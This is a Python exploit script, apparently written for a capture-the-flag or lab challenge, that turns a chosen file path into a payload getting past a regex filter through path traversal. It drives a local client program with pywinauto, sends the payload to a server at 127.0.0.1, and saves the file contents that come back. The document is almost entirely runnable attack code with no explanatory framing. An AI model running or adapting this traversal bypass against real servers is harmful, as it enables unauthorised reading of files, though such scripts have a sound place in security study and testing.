from os import remove, path
from re import findall, sub
from pywinauto import Application


executable = "Client/bin/Debug/netcoreapp3.1/Client.exe"
address = "127.0.0.1"

print("Starting exploit (regex bypass):")

target = input("  Path: ")

payload = target.replace("../", "./...//..")
payload = sub("/([a-zA-Z_-]+)", "//..\\1", payload)
if payload[0] == "/":
    payload = "/.." + payload

filter = "\.\./|/\.\.|/[a-zA-Z_-]+|^/|/$"
if sub(filter, "", payload) != target:
    print("Failed to construct a valid payload! Try a different path!")
    exit(1)

print(f"Payload constructed: \"{payload}\"!")

app = Application()
app.start("cmd.exe", wait_for_idle=False, create_new_console=True)
print(f"Running executable...")
app.window().type_keys(f"\"{executable}\" > __out", with_spaces=True)
app.window().type_keys("{ENTER}", pause=0.1)
print(f"Entering payload...")
app.window().type_keys(payload, with_spaces=True)
app.window().type_keys("{ENTER}", pause=0.1)
print(f"Connecting to the server...")
app.window().type_keys(address, with_spaces=True)
app.window().type_keys("{ENTER}", pause=0.1)

print(f"Reading data...")
app.window().type_keys("/memories", with_spaces=True)
app.window().type_keys("{ENTER}", pause=0.1)
print(f"Disconnecting...")
app.window().type_keys("/leave", with_spaces=True)
app.window().type_keys("{ENTER}", pause=0.1)

app.kill()
print(f"Parsing data...")

regex = r"(?<=Things you remember:\s)((.|\s)+?)(?=\s*<< /\s+/l\s+/le)"
data = ""
with open("__out", "r") as file:
    data = file.read()

data = findall(regex, data)[0][0]
data = sub("(\n|^)  ", "\\1", data)
remove("__out")

outfile = path.basename(target)
print(f"Saving data to {outfile}...")
with open(outfile, "w") as file:
    file.write(data)

print("Done!")
